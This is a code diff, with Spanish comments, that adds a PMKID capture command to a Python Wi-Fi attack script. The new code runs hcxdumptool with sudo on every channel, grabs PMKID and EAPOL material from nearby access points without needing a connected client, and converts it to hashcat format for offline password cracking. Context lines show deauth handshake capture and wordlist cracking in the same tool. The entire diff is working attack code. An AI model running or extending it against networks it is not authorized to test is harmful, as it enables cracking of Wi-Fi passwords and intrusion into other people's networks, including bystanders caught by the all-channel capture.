@@ -274,6 +274,88 @@ def capture_handshake(bssid, channel, iface, capture_seconds=20, deauth_count=5,
     return has_hs, cap_file, aircrack_output
 
 
+def pmkid_capture(bssid, channel, iface, seconds=30):
+    """Captura PMKID/EAPOL con hcxdumptool 6.3.x y lo convierte a .hc22000
+    (formato hashcat) con hcxpcapngtool. El PMKID se obtiene del AP SIN
+    necesitar un cliente conectado (a diferencia del handshake).
+
+    hcxdumptool 6.3.x pone el modo monitor EL MISMO (su propio help avisa:
+    'Do not set monitor mode by third party tools') y no admite otra
+    herramienta sobre la interfaz en paralelo. Por eso aca NO usamos
+    enable_monitor: dejamos wlan1 en managed y hcxdumptool la toma. Captura en
+    TODOS los canales (-F) unos segundos; despues filtramos el resultado por el
+    BSSID objetivo leyendo el .hc22000 (targeting por BPF en 6.3.x es fragil).
+
+    Devuelve (data, err). data trae: pcap, hc22000, hashes (lineas totales),
+    pmkid_target/eapol_target (si capturo algo para ESE bssid), detail."""
+    bssid = bssid.upper()
+    bssid_nc = bssid.replace(":", "")   # sin ':' , como aparece en el .hc22000
+
+    # Estado limpio en managed (NO monitor nuestro); hcxdumptool setea monitor.
+    disable_monitor(iface)
+
+    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
+    os.makedirs(cap_dir, exist_ok=True)
+    ts = int(time.time())
+    prefix = f"{cap_dir}/pmkid_{bssid_nc}_{ts}"
+    pcap = prefix + ".pcapng"
+    hc = prefix + ".hc22000"
+    logpath = prefix + "_hcxdump.log"
+
+    with open(logpath, "w") as lf:
+        r = _run(['sudo', '/usr/bin/timeout', str(seconds),
+                  '/usr/bin/hcxdumptool', '-i', iface, '-w', pcap, '-F'],
+                 timeout=seconds + 10)
+        if r:
+            lf.write((r.stdout or '') + (r.stderr or ''))
+
+    # hcxdumptool deja la interfaz en monitor: la devolvemos a managed.
+    disable_monitor(iface)
+
+    def _tail(path, n=400):
+        try:
+            with open(path, "r", errors="replace") as f:
+                return f.read()[-n:]
+        except Exception:
+            return ""
+
+    if not os.path.exists(pcap):
+        return None, f"hcxdumptool no genero captura. Log: {_tail(logpath)}"
+
+    # Convertir a hc22000 (no necesita root; lee el pcapng).
+    conv = _run(['/usr/bin/hcxpcapngtool', '-o', hc, pcap], timeout=30)
+    conv_out = ((conv.stdout or '') + (conv.stderr or '')) if conv else ''
+
+    # Formato hc22000: WPA*<tipo>*<mic/pmkid>*<MAC_AP>*<MAC_STA>*<ESSID_hex>*...
+    # tipo 01 = PMKID, 02 = EAPOL. MAC_AP (4o campo) es hex sin ':'.
+    lines = []
+    if os.path.exists(hc):
+        try:
+            with open(hc, "r", errors="replace") as f:
+                lines = [l.strip() for l in f if l.strip()]
+        except Exception:
+            lines = []
+
+    pmkid_target = eapol_target = False
+    for l in lines:
+        p = l.split("*")
+        if len(p) >= 4 and p[3].upper() == bssid_nc:
+            if p[1] == "01":
+                pmkid_target = True
+            elif p[1] == "02":
+                eapol_target = True
+
+    data = {
+        "pcap": pcap,
+        "hc22000": hc if os.path.exists(hc) else None,
+        "hashes": len(lines),
+        "pmkid_target": pmkid_target,
+        "eapol_target": eapol_target,
+        "detail": conv_out[-400:],
+    }
+    return data, None
+
+
 # OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
 # Preferimos una base del sistema si existe (completa); si no, un fallback chico.
 _OUI_BUILTIN = {
@@ -617,6 +699,25 @@ def main():
         else:
             log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
             print(json.dumps({"ok": True, "found": False, "wordlist": wordlist_key}))
+    elif cmd == 'pmkid':
+        if len(sys.argv) < 4:
+            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py pmkid <bssid> <channel> [iface] [segundos]"}))
+            sys.exit(1)
+        bssid = sys.argv[2]
+        channel = int(sys.argv[3])
+        iface_pk = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
+        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 30
+        data, err = pmkid_capture(bssid, channel, iface_pk, seconds)
+        if err:
+            log_attack("pmkid", bssid, "fail", details=err)
+            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_pk)}))
+        else:
+            got = data["pmkid_target"] or data["eapol_target"]
+            log_attack("pmkid", bssid, "success" if got else "nada",
+                       details=f"hashes={data['hashes']} pmkid={data['pmkid_target']} eapol={data['eapol_target']} hc={data['hc22000']}")
+            out = {"ok": True}
+            out.update(data)
+            print(json.dumps(out))
     elif cmd == 'clients':
         if len(sys.argv) < 4:
             print(json.dumps({"ok": False, "error": "uso: wifi_ops.py clients <bssid> <channel> [iface] [segundos]"}))
